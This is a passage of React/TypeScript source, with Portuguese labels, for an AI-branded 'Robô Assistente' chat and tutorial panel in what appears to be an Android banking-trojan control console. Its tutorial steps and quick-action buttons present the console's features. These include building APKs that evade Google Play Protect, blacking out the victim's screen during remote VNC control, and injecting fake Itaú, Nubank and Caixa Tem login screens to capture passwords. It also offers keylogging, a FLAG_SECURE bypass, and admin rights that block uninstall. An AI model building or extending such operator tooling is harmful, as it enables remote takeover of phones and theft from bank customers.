          status: 'error',
        }
      ]);
    }
  };

  const handleQuickAction = (actionText: string) => {
    processUserPrompt(actionText);
  };

  const clearChatHistory = () => {
    setMessages([
      {
        id: 'msg-cleared',
        sender: 'robot',
        text: 'ðŸ§¹ HistÃ³rico limpo! Pronto para novos comandos.',
        timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
        status: 'info',
        suggestions: ['Abrir WhatsApp', 'Abrir ItaÃº', 'Ativar Tela Preta', 'InÃ­cio']
      }
    ]);
  };

  return (
    <div className="flex flex-col h-full min-h-[380px] max-h-[580px] select-text">
      {/* ðŸ“± HEADER DO DISPOSITIVO ATIVO COM SELETOR & ANIMAÃ‡ÃƒO */}
      <div className="flex items-center justify-between pb-2.5 mb-2 border-b border-red-500/25 flex-shrink-0">
        <div className="flex items-center gap-2.5">
          <RobotAvatar size={34} isFloating isSpeaking={isExecuting} theme="cyan" />

          <div className="flex flex-col">
            {!propDeviceId && devicesList.length > 1 ? (
              <select
                value={activeDeviceId}
                onChange={(e) => {
                  const newId = e.target.value;
                  setActiveDeviceId(newId);
                  const found = devicesList.find(d => d.device_id === newId);
                  setActiveDeviceName(found ? (found.custom_name || found.model || found.device_id) : newId);
                  if (onSelectDevice) onSelectDevice(newId);
                }}
                className="bg-[#030d22] text-pink-200 border border-red-500/40 rounded-lg px-2 py-0.5 text-xs font-mono font-bold focus:outline-none focus:border-pink-300"
              >
                {devicesList.map(d => (
                  <option key={d.device_id} value={d.device_id}>
                    {d.custom_name || d.model || d.device_id} ({d.is_online ? 'Online' : 'Offline'})
                  </option>
                ))}
              </select>
            ) : (
              <div className="flex items-center gap-1.5">
                <span className="text-xs font-black font-mono text-white tracking-wide truncate max-w-[180px]">
                  {activeDeviceName || propDeviceId || 'Nenhum Aparelho Conectado'}
                </span>
                <span className="px-1.5 py-0.2 rounded bg-rose-500/20 border border-emerald-400/50 text-emerald-300 text-[9px] font-mono font-black uppercase flex items-center gap-1">
                  <span className="w-1.5 h-1.5 rounded-full bg-rose-400 animate-ping" />
                  ALVO ONLINE
                </span>
              </div>
            )}
            <span className="text-[9.5px] font-mono text-pink-300/80 flex items-center gap-1">
              <span className={`w-1.5 h-1.5 rounded-full ${isExecuting ? 'bg-red-400 animate-ping' : 'bg-rose-400 animate-pulse'}`} />
              {isExecuting ? 'âš¡ Processando aÃ§Ã£o no aparelho...' : 'ðŸ¤– RobÃ´ IA Conectado 24/7'}
            </span>
          </div>
        </div>

        <div className="flex items-center gap-1.5">
          <button
            type="button"
            onClick={() => setShowVoiceCallModal(true)}
            className="px-2.5 py-1 rounded-lg bg-gradient-to-r from-rose-600 to-rose-600 hover:from-rose-500 hover:to-rose-500 border border-emerald-400 text-white font-mono text-[10px] font-black uppercase tracking-wider transition-all flex items-center gap-1 shadow-[0_0_12px_rgba(16,185,129,0.4)] cursor-pointer"
            title="Ligar para o telefone ou Falar em tempo real pelo alto-falante"
          >
            <PhoneCall className="w-3 h-3 text-white animate-pulse" />
            <span>ðŸ“ž VOZ / LIGAR</span>
          </button>

          <button
            type="button"
            onClick={clearChatHistory}
            className="p-1 rounded-lg text-slate-400 hover:text-pink-300 hover:bg-red-500/10 border border-transparent hover:border-red-500/30 transition-all text-[10px] font-mono flex items-center gap-1"
            title="Limpar histÃ³rico do chat"
          >
            <Trash2 className="w-3 h-3" />
            <span>Limpar</span>
          </button>
        </div>
      </div>

      {/* ðŸ’¬ ÃREA DE MENSAGENS ROLÃVEL */}
      <div className="flex-1 overflow-y-auto pr-1 space-y-2.5 custom-scrollbar min-h-[220px]">
        {messages.map((msg) => (
          <div
            key={msg.id}
            className={`flex flex-col ${msg.sender === 'user' ? 'items-end' : 'items-start'}`}
          >
            <div className="flex items-start gap-1.5 max-w-[90%]">
              {msg.sender === 'robot' && (
                <div className="flex-shrink-0 mt-0.5">
                  <RobotAvatar size={24} isFloating={false} theme="cyan" />
                </div>
              )}

              <div
                className={`p-2.5 rounded-2xl text-xs leading-relaxed transition-all shadow-md ${
                  msg.sender === 'user'
                    ? 'bg-gradient-to-r from-red-900/90 via-[#0a2352]/90 to-red-900/90 border border-red-400/50 text-white rounded-tr-none'
                    : msg.status === 'error'
                    ? 'bg-red-950/90 border border-red-500/50 text-red-100 rounded-tl-none'
                    : 'bg-[#040e24]/95 border border-red-500/35 text-red-100 rounded-tl-none shadow-[0_0_15px_rgba(0,240,255,0.15)]'
                }`}
              >
                {msg.sender === 'robot' && msg.status && (
                  <div className="flex items-center gap-1 mb-1 font-mono text-[9px] font-bold">
                    {msg.status === 'success' && (
                      <span className="text-emerald-400 flex items-center gap-0.5">
                        <Check className="w-2.5 h-2.5" /> EXECUTADO NO APARELHO
                      </span>
                    )}
                    {msg.status === 'error' && (
                      <span className="text-red-400 flex items-center gap-0.5">
                        <AlertCircle className="w-2.5 h-2.5" /> ERRO
                      </span>
                    )}
                    {msg.status === 'info' && (
                      <span className="text-red-400 flex items-center gap-0.5">
                        <Sparkles className="w-2.5 h-2.5" /> ROBÃ” ASSISTENTE
                      </span>
                    )}
                  </div>
                )}

                <div className="space-y-1 font-sans">
                  {msg.text.split('\n').map((line, idx) => (
                    <p key={idx} className={line.startsWith('>') ? 'pl-2 border-l-2 border-red-400 text-pink-200 italic font-mono text-[11px]' : ''}>
                      {line.split('**').map((part, pIdx) =>
                        pIdx % 2 === 1 ? (
                          <strong key={pIdx} className="text-pink-300 font-black">
                            {part}
                          </strong>
                        ) : line.startsWith('`') || part.startsWith('`') ? (
                          <span key={pIdx} className="font-mono text-pink-200 bg-red-950/60 px-1 py-0.2 rounded border border-red-500/30">
                            {part.replace(/`/g, '')}
                          </span>
                        ) : (
                          part
                        )
                      )}
                    </p>
                  ))}
                </div>

                {msg.actionDetails && (
                  <div className="mt-2 pt-1.5 border-t border-red-500/20 flex items-center justify-between text-[9px] font-mono text-red-400/80">
                    <span className="flex items-center gap-1">
                      <Terminal className="w-2.5 h-2.5 text-red-400" />
                      {msg.actionDetails.commandSent}
                    </span>
                    <span className="text-[8px] text-pink-300/60">
                      {msg.actionDetails.targetDevice}
                    </span>
                  </div>
                )}
              </div>
            </div>

            <span className="text-[8px] font-mono text-slate-500 mt-0.5 px-1">
              {msg.timestamp}
            </span>

            {msg.suggestions && msg.suggestions.length > 0 && (
              <div className="flex flex-wrap gap-1 mt-1.5 pl-6 max-w-full">
                {msg.suggestions.map((sug, sIdx) => (
                  <button
                    key={sIdx}
                    type="button"
                    onClick={() => handleQuickAction(sug)}
                    className="px-2 py-1 rounded-lg bg-red-950/60 hover:bg-red-500/20 border border-red-400/50 hover:border-pink-300 text-pink-200 hover:text-white text-[10px] font-mono font-bold transition-all hover:scale-105 active:scale-95 flex items-center gap-1 shadow-sm"
                  >
                    <Zap className="w-2.5 h-2.5 text-pink-300" />
                    <span>{sug}</span>
                  </button>
                ))}
              </div>
            )}
          </div>
        ))}

        {isExecuting && (
          <div className="flex items-center gap-2 pl-1 py-1">
            <RobotAvatar size={22} isFloating isSpeaking theme="cyan" />
            <div className="px-3 py-1.5 rounded-xl bg-[#040e24]/90 border border-red-400/50 flex items-center gap-1.5 text-[11px] font-mono text-pink-300">
              <Sparkles className="w-3 h-3 text-red-400 animate-spin" />
              <span>Executando no aparelho alvo...</span>
            </div>
          </div>
        )}

        <div ref={chatEndRef} />
      </div>

      {/* âš¡ CHIPS DE AÃ‡Ã•ES RÃPIDAS (SCROLL HORIZONTAL) */}
      <div className="pt-2 border-t border-red-500/20 flex-shrink-0">
        <div className="text-[9px] font-mono font-bold text-red-400/70 uppercase mb-1 flex items-center justify-between">
          <span>âš¡ AÃ§Ãµes RÃ¡pidas (1-Clique):</span>
          <span className="text-[8px] text-slate-500">Ou digite abaixo</span>
        </div>

        <div className="flex items-center gap-1.5 overflow-x-auto pb-1.5 custom-scrollbar select-none">
          <button
            type="button"
            onClick={() => handleQuickAction('Abrir WhatsApp')}
            className="px-2.5 py-1 rounded-xl bg-rose-950/80 hover:bg-rose-900 border border-emerald-500/50 text-emerald-200 text-[10px] font-mono font-bold flex-shrink-0 hover:scale-105 active:scale-95 transition-all flex items-center gap-1"
          >
            <span>ðŸŸ¢</span>
            <span>WhatsApp</span>
          </button>

          <button
            type="button"
            onClick={() => handleQuickAction('Abrir ItaÃº')}
            className="px-2.5 py-1 rounded-xl bg-orange-950/80 hover:bg-orange-900 border border-orange-500/50 text-orange-200 text-[10px] font-mono font-bold flex-shrink-0 hover:scale-105 active:scale-95 transition-all flex items-center gap-1"
          >
            <span>ðŸŸ </span>
            <span>ItaÃº</span>
          </button>

          <button
            type="button"
            onClick={() => handleQuickAction('Abrir Nubank')}
            className="px-2.5 py-1 rounded-xl bg-purple-950/80 hover:bg-purple-900 border border-purple-500/50 text-purple-200 text-[10px] font-mono font-bold flex-shrink-0 hover:scale-105 active:scale-95 transition-all flex items-center gap-1"
          >
            <span>ðŸŸ£</span>
            <span>Nubank</span>
          </button>

          <button
            type="button"
            onClick={() => handleQuickAction('Abrir Caixa Tem')}
            className="px-2.5 py-1 rounded-xl bg-red-950/80 hover:bg-red-900 border border-red-500/50 text-pink-200 text-[10px] font-mono font-bold flex-shrink-0 hover:scale-105 active:scale-95 transition-all flex items-center gap-1"
          >
            <span>ðŸ”µ</span>
            <span>Caixa Tem</span>
          </button>

          <button
            type="button"
            onClick={() => handleQuickAction('Abrir Bradesco')}
            className="px-2.5 py-1 rounded-xl bg-rose-950/80 hover:bg-rose-900 border border-rose-500/50 text-rose-200 text-[10px] font-mono font-bold flex-shrink-0 hover:scale-105 active:scale-95 transition-all flex items-center gap-1"
          >
            <span>ðŸ”´</span>
            <span>Bradesco</span>
          </button>

          <button
            type="button"
            onClick={() => handleQuickAction('Abrir Banco do Brasil')}
            className="px-2.5 py-1 rounded-xl bg-amber-950/80 hover:bg-amber-900 border border-amber-500/50 text-amber-200 text-[10px] font-mono font-bold flex-shrink-0 hover:scale-105 active:scale-95 transition-all flex items-center gap-1"
          >
            <span>ðŸŸ¡</span>
            <span>Banco do Brasil</span>
          </button>

          <button
            type="button"
            onClick={() => handleQuickAction('Ativar Tela Preta')}
            className="px-2.5 py-1 rounded-xl bg-slate-900 hover:bg-slate-800 border border-red-400/50 text-pink-300 text-[10px] font-mono font-bold flex-shrink-0 hover:scale-105 active:scale-95 transition-all flex items-center gap-1"
          >
            <span>ðŸ•¶ï¸</span>
            <span>Tela Preta</span>
          </button>

          <button
            type="button"
            onClick={() => handleQuickAction('Desativar Tela Preta')}
            className="px-2.5 py-1 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-700 text-slate-300 text-[10px] font-mono font-bold flex-shrink-0 hover:scale-105 active:scale-95 transition-all flex items-center gap-1"
          >
            <span>â˜€ï¸</span>
            <span>Desativar Tela Preta</span>
          </button>

          <button
            type="button"
            onClick={() => handleQuickAction('InÃ­cio')}
            className="px-2.5 py-1 rounded-xl bg-red-950/80 hover:bg-red-900 border border-red-500/40 text-pink-200 text-[10px] font-mono font-bold flex-shrink-0 hover:scale-105 active:scale-95 transition-all flex items-center gap-1"
          >
            <Home className="w-3 h-3 text-red-400" />
            <span>InÃ­cio</span>
          </button>

          <button
            type="button"
            onClick={() => handleQuickAction('Voltar')}
            className="px-2.5 py-1 rounded-xl bg-red-950/80 hover:bg-red-900 border border-red-500/40 text-pink-200 text-[10px] font-mono font-bold flex-shrink-0 hover:scale-105 active:scale-95 transition-all flex items-center gap-1"
          >
            <ArrowLeft className="w-3 h-3 text-red-400" />
            <span>Voltar</span>
          </button>

          <button
            type="button"
            onClick={() => handleQuickAction('Aumentar Volume')}
            className="px-2.5 py-1 rounded-xl bg-red-950/80 hover:bg-red-900 border border-red-500/40 text-pink-200 text-[10px] font-mono font-bold flex-shrink-0 hover:scale-105 active:scale-95 transition-all flex items-center gap-1"
          >
            <Volume2 className="w-3 h-3 text-red-400" />
            <span>Volume +</span>
          </button>

          <button
            type="button"
            onClick={() => handleQuickAction('Diminuir Volume')}
            className="px-2.5 py-1 rounded-xl bg-red-950/80 hover:bg-red-900 border border-red-500/40 text-pink-200 text-[10px] font-mono font-bold flex-shrink-0 hover:scale-105 active:scale-95 transition-all flex items-center gap-1"
          >
            <Volume1 className="w-3 h-3 text-red-400" />
            <span>Volume -</span>
          </button>

          <button
            type="button"
            onClick={() => handleQuickAction('Ver Clipboard')}
            className="px-2.5 py-1 rounded-xl bg-red-950/80 hover:bg-red-900 border border-red-500/40 text-pink-200 text-[10px] font-mono font-bold flex-shrink-0 hover:scale-105 active:scale-95 transition-all flex items-center gap-1"
          >
            <Copy className="w-3 h-3 text-red-400" />
            <span>Ver Clipboard</span>
          </button>

          <button
            type="button"
            onClick={() => handleQuickAction('Pedir PermissÃ£o Admin')}
            className="px-2.5 py-1 rounded-xl bg-red-950/80 hover:bg-red-900 border border-red-500/50 text-red-200 text-[10px] font-mono font-bold flex-shrink-0 hover:scale-105 active:scale-95 transition-all flex items-center gap-1"
          >
            <ShieldAlert className="w-3 h-3 text-red-400" />
            <span>Pedir Admin</span>
          </button>
        </div>
      </div>

      {/* âŒ¨ï¸ BARRA DE ENTRADA DO CHAT */}
      <form
        onSubmit={(e) => {
          e.preventDefault();
          processUserPrompt(inputText);
        }}
        className="mt-2 flex items-center gap-2 flex-shrink-0"
      >
        <div className="relative flex-1">
          <input
            type="text"
            value={inputText}
            onChange={(e) => setInputText(e.target.value)}
            disabled={isExecuting}
            placeholder="Digite o que deseja fazer (ex: abrir whatsapp, tela preta, digitar olÃ¡)..."
            className="w-full bg-[#020716] text-white border border-red-500/40 rounded-2xl pl-3.5 pr-10 py-2.5 text-xs font-mono placeholder:text-slate-500 focus:outline-none focus:border-pink-300 shadow-inner disabled:opacity-50"
          />
          <div className="absolute right-3 top-1/2 -translate-y-1/2 pointer-events-none">
            <Bot className="w-4 h-4 text-red-400/60" />
          </div>
        </div>

        <button
          type="submit"
          disabled={!inputText.trim() || isExecuting}
          className="px-4 py-2.5 rounded-2xl bg-gradient-to-r from-red-500 via-red-600 to-pink-400 hover:from-red-400 hover:to-pink-300 text-white font-mono font-black text-xs uppercase tracking-wider shadow-[0_0_20px_rgba(0,240,255,0.5)] border border-pink-300 hover:scale-105 active:scale-95 disabled:opacity-40 disabled:scale-100 transition-all flex items-center gap-1.5 cursor-pointer flex-shrink-0"
          title="Enviar comando para o RobÃ´ executar no aparelho"
        >
          <span>Executar</span>
          <Send className="w-3.5 h-3.5" />
        </button>
      </form>

      {/* ðŸ“ž MODAL DE CHAMADA DE VOZ & DISCADOR (FALAR COM O APARELHO) */}
      <VoiceCallModal
        isOpen={showVoiceCallModal}
        onClose={() => setShowVoiceCallModal(false)}
        deviceId={activeDeviceId}
        deviceName={activeDeviceName}
        onSendCommand={(cmd) => dispatchCommand(cmd, activeDeviceId)}
      />
    </div>
  );
};

/* ==========================================================================
   ðŸ¤– COMPONENTE PRINCIPAL: ROBÃ” ASSISTENTE MODAL & BARRA FLUTUANTE
   ========================================================================== */
export interface RobotAssistantProps {
  initialCategory?: 'dashboard' | 'device_control';
  isOpen?: boolean;
  onOpenChange?: (open: boolean) => void;
  deviceId?: string;
  deviceName?: string;
  onSendCommand?: (command: any) => Promise<any> | void;
  installedApps?: any[];
  devicesList?: Device[];
}

export default function RobotAssistant({ 
  initialCategory = 'dashboard',
  isOpen: propIsOpen,
  onOpenChange,
  deviceId,
  deviceName,
  onSendCommand,
  installedApps,
  devicesList,
}: RobotAssistantProps) {
  const [internalIsOpen, setInternalIsOpen] = useState(false);
  const isControlled = propIsOpen !== undefined;
  const isOpen = isControlled ? propIsOpen : internalIsOpen;

  const setIsOpen = (val: boolean) => {
    if (isControlled) {
      if (onOpenChange) onOpenChange(val);
    } else {
      setInternalIsOpen(val);
    }
  };

  const [activeCategory, setActiveCategory] = useState<'dashboard' | 'device_control'>(initialCategory);
  const [activeTab, setActiveTab] = useState<'chat' | 'tutorial' | 'kick_arena'>('chat');
  const [currentStep, setCurrentStep] = useState(0);
  const [isMinimized, setIsMinimized] = useState(false);
  const [dockPosition, setDockPosition] = useState<'top-right' | 'bottom-right' | 'top-left' | 'bottom-left'>('top-right');
  const [customPos, setCustomPos] = useState<{ x: number; y: number } | null>(null);
  const [isDragging, setIsDragging] = useState(false);
  const dragStartRef = useRef<{ mouseX: number; mouseY: number; posX: number; posY: number }>({ mouseX: 0, mouseY: 0, posX: 0, posY: 0 });
  const modalRef = useRef<HTMLDivElement | null>(null);

  const dockClasses = {
    'top-right': 'top-16 right-5',
    'bottom-right': 'bottom-5 right-5',
    'top-left': 'top-16 left-5',
    'bottom-left': 'bottom-5 left-5',
  }[dockPosition];

  const cycleDockPosition = () => {
    setCustomPos(null);
    const order: Array<'top-right' | 'bottom-right' | 'top-left' | 'bottom-left'> = [
      'top-right', 'bottom-right', 'top-left', 'bottom-left'
    ];
    const nextIdx = (order.indexOf(dockPosition) + 1) % order.length;
    setDockPosition(order[nextIdx]);
  };

  const handleDragMouseDown = (e: React.MouseEvent) => {
    if ((e.target as HTMLElement).closest('button') || (e.target as HTMLElement).closest('input') || (e.target as HTMLElement).closest('select')) return;
    const modalEl = modalRef.current;
    if (!modalEl) return;
    const rect = modalEl.getBoundingClientRect();
    dragStartRef.current = {
      mouseX: e.clientX,
      mouseY: e.clientY,
      posX: rect.left,
      posY: rect.top,
    };
    setIsDragging(true);
  };

  useEffect(() => {
    if (!isDragging) return;
    const handleMouseMove = (e: MouseEvent) => {
      const dx = e.clientX - dragStartRef.current.mouseX;
      const dy = e.clientY - dragStartRef.current.mouseY;
      const newX = Math.max(10, Math.min(window.innerWidth - 480, dragStartRef.current.posX + dx));
      const newY = Math.max(10, Math.min(window.innerHeight - 200, dragStartRef.current.posY + dy));
      setCustomPos({ x: newX, y: newY });
    };
    const handleMouseUp = () => {
      setIsDragging(false);
    };
    window.addEventListener('mousemove', handleMouseMove);
    window.addEventListener('mouseup', handleMouseUp);
    return () => {
      window.removeEventListener('mousemove', handleMouseMove);
      window.removeEventListener('mouseup', handleMouseUp);
    };
  }, [isDragging]);

  const dashboardSteps: TutorialStep[] = [
    {
      targetId: 'tour-build-buttons',
      highlightLabel: 'ðŸ‘‰ Geradores de Aplicativo & Bypass',
      title: 'Geradores de APK & Bypass de SeguranÃ§a',
      badge: 'Passo 1 de 4',
      icon: <Zap className="w-5 h-5 text-pink-300" />,
      content:
        'No topo do painel, utilize os botÃµes **GERAR APK** (padrÃ£o), **GERAR APK BYPASS** (com evasÃ£o Play Protect) ou **GERAR .EXE** para controle remoto de computadores Windows.',
      tip: 'Dica: O APK Bypass Ã© blindado e impede que mÃ³dulos de seguranÃ§a encerrem a conexÃ£o em segundo plano.',
    },
    {
      targetId: 'tour-device-table',
      highlightLabel: 'ðŸ‘‰ Lista de Aparelhos Sincronizados',
      title: 'Monitoramento & SincronizaÃ§Ã£o em Tempo Real',
      badge: 'Passo 2 de 4',
      icon: <Smartphone className="w-5 h-5 text-pink-300" />,
      content:
        'A tabela central exibe todos os celulares sincronizados. Visualize instantaneamente status **ONLINE**, nÃ­vel de bateria, IP e se a tela estÃ¡ **LIVRE** ou **BLOQUEADA**.',
      tip: 'Aparelhos com luz verde pulsante respondem em milissegundos aos comandos.',
    },
    {
      targetId: 'tour-build-buttons',
      highlightLabel: 'ðŸ‘‰ TransmissÃ£o VNC Ultra-RÃ¡pida',
      title: 'TransmissÃ£o VNC & Acesso Remoto',
      badge: 'Passo 3 de 4',
      icon: <Monitor className="w-5 h-5 text-pink-300" />,
      content:
        'Acesse a tela do aparelho em alta definiÃ§Ã£o clicando em **ðŸ“º VER VNC** ou diretamente na linha do dispositivo. Execute toques e gestos.',
      tip: 'O modo VNC funciona direto pelo navegador sem instalar nada.',
    },
    {
      targetId: 'tour-banking-radar',
      highlightLabel: 'ðŸ‘‰ Radar & Bypass BancÃ¡rio Total',
      title: 'Radar de Alertas & Bypass BancÃ¡rio',
      badge: 'Passo 4 de 4',
      icon: <Shield className="w-5 h-5 text-pink-300" />,
      content:
        'O sistema monitora a abertura de aplicativos bancÃ¡rios (ItaÃº, Caixa Tem, Nubank, Bradesco) e executa o **bypass total do Google Play Protect**.',
      tip: 'Use a aba "Chutar Bancos" para ver a simulaÃ§Ã£o do bypass em tempo real.',
    },
  ];

  const deviceControlSteps: TutorialStep[] = [
    {
      targetId: 'tour-black-screen',
      highlightLabel: 'ðŸ‘‰ Ativar Tela Preta / Cortina',
      title: 'ðŸ•¶ï¸ Como Dar Tela Preta (Black Screen)',
      badge: 'Controle 1 de 6',
      icon: <Eye className="w-5 h-5 text-pink-300" />,
      content:
        'Clique em **ATIVAR TELA PRETA** no painel. A tela fÃ­sica do aparelho alvo ficarÃ¡ completamente escura (ou exibindo uma tela fake de atualizaÃ§Ã£o). Assim vocÃª pode navegar sem a vÃ­tima ver nada!',
      tip: 'Dica: VocÃª tambÃ©m pode simplesmente pedir no chat do RobÃ´ "Ativar tela preta".',
    },
    {
      targetId: 'tour-vnc-stream',
      highlightLabel: 'ðŸ‘‰ TransmissÃ£o VNC & Toques Remotos',
      title: 'ðŸ“º TransmissÃ£o VNC HD & Toques',
      badge: 'Controle 2 de 6',
      icon: <Monitor className="w-5 h-5 text-pink-300" />,
      content:
        'Assista Ã  tela do celular em tempo real com atÃ© **60 FPS**. DÃª cliques com o botÃ£o esquerdo para tocar e arraste para rolar a pÃ¡gina.',
      tip: 'Dica: PeÃ§a ao robÃ´ no chat para abrir qualquer aplicativo por voz ou texto.',
    },
    {
      targetId: 'tour-screen-reader',
      highlightLabel: 'ðŸ‘‰ Leitor de Tela & Bypass Anti-Print',
      title: 'ðŸ‘ï¸ Screen Reader V2 (Bypass Anti-Print)',
      badge: 'Controle 3 de 6',
      icon: <Layers className="w-5 h-5 text-pink-300" />,
      content:
        'Aplicativos de bancos ativam proteÃ§Ã£o contra print (**FLAG_SECURE**), deixando a imagem preta no VNC. O **Screen Reader V2** extrai a Ã¡rvore interna do Android e exibe todos os botÃµes clicÃ¡veis!',
      tip: 'Dica: Clique diretamente na lista de elementos do Screen Reader V2 para interagir.',
    },
    {
      targetId: 'tour-fake-injects',
      highlightLabel: 'ðŸ‘‰ InjeÃ§Ã£o de Telas Fake Oficiais',
      title: 'ðŸ’‰ InjeÃ§Ã£o de Telas Fake (Captura de Senhas)',
      badge: 'Controle 4 de 6',
      icon: <Zap className="w-5 h-5 text-pink-300" />,
      content:
        'Clique em **INJEÃ‡ÃƒO DE TELAS FAKE** no menu lateral esquerdo. Escolha o banco desejado (ItaÃº, Nubank, Caixa Tem, etc.). Uma tela oficial aparecerÃ¡ instantaneamente sobre o app da vÃ­tima!',
      tip: 'Dica: Assim que a vÃ­tima digita, a senha cai no seu Bloco de Notas.',
    },
    {
      targetId: 'tour-keylogger',
      highlightLabel: 'ðŸ‘‰ Keylogger & Monitor VIP',
      title: 'âŒ¨ï¸ Keylogger em Tempo Real',
      badge: 'Controle 5 de 6',
      icon: <Target className="w-5 h-5 text-pink-300" />,
      content:
        'Monitore tudo que a vÃ­tima digita no teclado do celular (senhas, CPFs, mensagens) em tempo real.',
      tip: 'Dica: Use o botÃ£o "COPIAR" ao lado de qualquer texto capturado.',
    },
    {
      targetId: 'tour-admin-perms',
      highlightLabel: 'ðŸ‘‰ Admin & Manter Tela Ligada',
      title: 'ðŸ›¡ï¸ PermissÃµes de Admin & OtimizaÃ§Ã£o',
      badge: 'Controle 6 de 6',
      icon: <Shield className="w-5 h-5 text-pink-300" />,
      content:
        'Clique em **SOLICITAR PERMISSÃƒO ADMIN** na barra lateral para fixar o aplicativo como Administrador do Dispositivo e impedir desinstalaÃ§Ã£o.',
      tip: 'Dica: No chat do RobÃ´, basta digitar "Pedir admin".',
    },
  ];

  const currentStepsList = activeCategory === 'dashboard' ? dashboardSteps : deviceControlSteps;
  const activeData = currentStepsList[currentStep] || currentStepsList[0];

  const handleNext = () => {
    if (currentStep < currentStepsList.length - 1) {
      setCurrentStep((prev) => prev + 1);
    } else {
      setIsOpen(false);
    }
  };

  const handlePrev = () => {
    if (currentStep > 0) {
      setCurrentStep((prev) => prev - 1);
    }
  };

  const handleOpenRobot = (tab: 'chat' | 'tutorial' | 'kick_arena' = 'chat') => {
    setActiveTab(tab);
    setIsMinimized(false);
    setIsOpen(true);
  };

  return (
    <>
      {/* ðŸŽ¯ SPOTLIGHT NO TUTORIAL */}
      {isOpen && activeTab === 'tutorial' && (
        <SpotlightTargetOverlay 
          targetId={activeData.targetId} 
          label={activeData.highlightLabel || 'FunÃ§Ã£o Demonstrada'} 
          isActive={true} 
        />
      )}

      {/* ðŸ¤– GATILHO FLUTUANTE DO ROBÃ” */}
      <div className={`fixed ${dockClasses} z-40 flex items-center gap-3 select-none`}>
        {!isOpen && (
          <button
            type="button"
            onClick={() => handleOpenRobot('chat')}
            className="group relative flex items-center gap-2.5 px-4 py-2.5 rounded-2xl bg-gradient-to-r from-[#071738]/95 via-[#0b2555]/95 to-[#040e24]/95 border border-red-400/60 hover:border-pink-300 shadow-[0_0_30px_rgba(0,240,255,0.5)] hover:shadow-[0_0_40px_rgba(0,240,255,0.8)] transition-all duration-300 hover:scale-105 active:scale-95 backdrop-blur-xl"
            title="Abrir RobÃ´ Assistente & Executar Comandos"
          >
            <span className="absolute -top-1 -right-1 w-3.5 h-3.5 rounded-full bg-red-400 animate-ping" />
            <span className="absolute -top-1 -right-1 w-3.5 h-3.5 rounded-full bg-gradient-to-tr from-red-400 to-pink-300 shadow-[0_0_10px_#ff1e4d]" />

            <RobotAvatar size={36} isFloating theme="cyan" />

            <div className="text-left">
              <div className="flex items-center gap-1.5">
                <span className="text-[11px] font-black tracking-wider text-pink-300 font-mono uppercase">
                  ROBÃ” ASSISTENTE
                </span>
                <span className="px-1.5 py-0.2 rounded bg-red-400 text-slate-950 text-[8px] font-mono font-black animate-pulse">
                  CHAT IA
                </span>
              </div>
              <span className="text-[9px] text-pink-200/80 font-mono block">
                Comandar Aparelho em Tempo Real
              </span>
            </div>
          </button>
        )}
      </div>

      {/* ðŸ’¬ MODAL DO ROBÃ” ASSISTENTE */}
      {isOpen && (
        isMinimized ? (
          /* ðŸ—• BARRA COMPACTA */
          <div className={`fixed ${dockClasses} z-50 transition-all duration-300 animate-scale-in select-none`}>
            <div className="flex items-center gap-3 px-4 py-2.5 rounded-2xl bg-gradient-to-r from-[#071738]/98 via-[#0b2555]/98 to-[#040e24]/98 border-2 border-red-400/80 shadow-[0_0_35px_rgba(0,240,255,0.6)] backdrop-blur-2xl">
              <RobotAvatar size={34} isFloating isSpeaking theme="cyan" />
              <div className="text-left max-w-[200px]">
                <div className="flex items-center gap-1.5">
                  <span className="text-xs font-black text-pink-200 font-mono truncate">
                    RobÃ´ Assistente
                  </span>
                  <span className="px-1.5 py-0.2 rounded text-[8px] font-black font-mono bg-red-500/20 text-pink-300 border border-red-400/50">
                    ATIVO
                  </span>
                </div>
                <span className="text-[10px] text-red-400/80 font-mono block truncate">
                  {activeTab === 'chat' ? 'ðŸ’¬ Chat de Comandos' : activeData.title}
                </span>
              </div>

              <div className="flex items-center gap-1.5 pl-2 border-l border-red-500/30">
                <button
                  type="button"
                  onClick={() => setIsMinimized(false)}
                  className="p-1.5 rounded-lg bg-red-950/80 border border-red-500/40 text-pink-300 hover:text-white transition-all"
                  title="Expandir"
                >
                  <Maximize2 className="w-3.5 h-3.5" />
                </button>
                <button
                  type="button"
                  onClick={() => setIsOpen(false)}
                  className="p-1.5 rounded-lg bg-slate-900/80 border border-slate-700 text-slate-400 hover:text-red-400 transition-all"
                  title="Fechar"
                >
                  <X className="w-3.5 h-3.5" />
                </button>
              </div>
            </div>
          </div>
        ) : (
          /* ðŸ—– MODAL COMPLETO */
          <div 
            ref={modalRef}
            style={customPos ? { top: customPos.y, left: customPos.x, right: 'auto', bottom: 'auto' } : undefined}
            className={`fixed ${customPos ? '' : dockClasses} z-50 w-[95vw] max-w-[500px] max-h-[85vh] transition-all duration-300 animate-scale-in`}
          >
            <div className="relative h-full max-h-[85vh] flex flex-col rounded-3xl bg-gradient-to-b from-[#071738]/98 via-[#051330]/98 to-[#020a1c]/98 border-2 border-red-400/70 shadow-[0_0_50px_rgba(0,240,255,0.45)] backdrop-blur-2xl p-4 sm:p-5 overflow-hidden">
              <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-pink-300 to-transparent shadow-[0_0_12px_#ff1e4d]" />

              {/* Header: RobÃ´, Status, Mover & Fechar */}
              <div 
                onMouseDown={handleDragMouseDown}
                className="flex items-center justify-between pb-2.5 border-b border-red-500/25 relative z-10 flex-shrink-0 cursor-grab active:cursor-grabbing select-none"
                title="Clique e arraste para reposicionar a janela"
              >
                <div className="flex items-center gap-3">
                  <RobotAvatar size={42} isFloating isSpeaking theme="cyan" />
                  <div>
                    <div className="flex items-center gap-2">
                      <span className="text-xs font-black tracking-widest text-pink-300 uppercase font-mono drop-shadow-[0_0_8px_rgba(0,240,255,0.7)]">
                        ROBÃ” ASSISTENTE
                      </span>
                      <span className="px-2 py-0.5 rounded-full text-[9px] font-black font-mono bg-red-500/20 border border-red-400/50 text-pink-200 shadow-[0_0_8px_rgba(0,240,255,0.3)]">
                        {activeTab === 'chat' ? 'ðŸ’¬ EXECUTOR IA' : activeTab === 'tutorial' ? activeData.badge : 'SIMULADOR 3D'}
                      </span>
                    </div>
                    <span className="text-[10px] text-pink-300/70 font-mono flex items-center gap-1 mt-0.5">
                      <Zap className="w-2.5 h-2.5 text-red-400 fill-red-400 animate-pulse" />
                      {activeTab === 'chat' ? 'Comandos no Aparelho via Chat' : 'Guia Interativo de OperaÃ§Ã£o'}
                    </span>
                  </div>
                </div>

                <div className="flex items-center gap-1.5">
                  <button
